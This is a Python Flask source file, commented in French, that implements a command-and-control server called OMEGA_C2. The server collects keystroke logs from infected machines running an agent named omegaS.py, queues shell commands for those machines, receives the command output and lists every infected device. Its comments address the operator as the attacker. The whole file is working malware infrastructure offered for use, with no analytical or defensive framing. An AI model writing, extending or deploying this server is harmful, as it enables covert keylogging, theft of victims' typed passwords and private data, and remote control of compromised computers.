from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)

# --- BASE DE DONNÉES TEMPORAIRE (EN MÉMOIRE) ---
# Dans une production réelle, utilisez Redis ou PostgreSQL.
# Structure : { "agent_id": {"command": "none", "results": [], "logs": ""} }
db = {}

@app.route('/')
def index():
    return "[STATUS: OMEGA_C2_SERVER_ACTIVE]", 200

# --- ROUTES POUR L'AGENT (omegaS.py) ---

@app.route('/logs/<agent_id>', methods=['POST'])
def receive_logs(agent_id):
    """Reçoit les frappes clavier de l'agent."""
    data = request.json.get('payload', '')
    if agent_id not in db:
        db[agent_id] = {"command": "none", "results": [], "logs": ""}
    
    db[agent_id]["logs"] += data
    print(f"[*] Logs reçus de {agent_id}")
    return jsonify({"status": "success"}), 200

@app.route('/get_cmd/<agent_id>', methods=['GET'])
def get_command(agent_id):
    """L'agent appelle cette route pour savoir s'il doit exécuter quelque chose."""
    if agent_id not in db:
        db[agent_id] = {"command": "none", "results": [], "logs": ""}
    
    command = db[agent_id]["command"]
    # Une fois récupérée, on peut réinitialiser la commande à "none"
    db[agent_id]["command"] = "none"
    return jsonify({"command": command}), 200

@app.route('/result/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    """Reçoit le résultat d'une commande exécutée par l'agent."""
    output = request.json.get('output', '')
    cmd = request.json.get('command', '')
    
    if agent_id in db:
        db[agent_id]["results"].append({"command": cmd, "output": output})
    
    print(f"[!] Résultat reçu de {agent_id} pour la commande : {cmd}")
    return jsonify({"status": "received"}), 200


# --- ROUTES POUR L'ATTAQUANT (VOUS) ---

@app.route('/set_cmd/<agent_id>', methods=['POST'])
def set_command(agent_id):
    """Vous permet d'envoyer une commande à un agent spécifique."""
    cmd = request.json.get('command', 'none')
    if agent_id not in db:
        db[agent_id] = {"command": "none", "results": [], "logs": ""}
    
    db[agent_id]["command"] = cmd
    return jsonify({"status": f"Command set for {agent_id}"}), 200

@app.route('/view/<agent_id>', methods=['GET'])
def view_agent(agent_id):
    """Affiche toutes les données collectées pour un agent."""
    if agent_id in db:
        return jsonify(db[agent_id]), 200
    return jsonify({"error": "Agent not found"}), 404

@app.route('/agents', methods=['GET'])
def list_agents():
    """Liste tous les appareils infectés connectés au serveur."""
    return jsonify(list(db.keys())), 200


if __name__ == "__main__":
    # Railway utilise la variable d'environnement PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
